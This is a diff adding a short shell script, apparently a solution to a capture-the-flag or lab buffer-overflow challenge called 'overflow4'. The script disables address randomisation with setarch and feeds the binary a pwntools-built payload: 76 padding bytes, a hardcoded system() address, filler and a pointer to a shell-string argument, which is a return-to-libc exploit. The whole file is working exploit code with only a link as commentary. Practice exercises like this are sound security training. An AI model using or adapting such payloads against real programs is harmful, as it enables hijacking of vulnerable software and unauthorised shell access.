@@ -1,0 +1,5 @@
+# https://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization
+
+setarch $(uname -m) -R ./overflow4-4834efeff17abdfb \
+  $(python -c 'from pwn import *; system = p32(0xb7e4a3e0); sc = p32(0xb7e1b35f); \
+  print "A" * 76 + system + "XXXX" + sc')
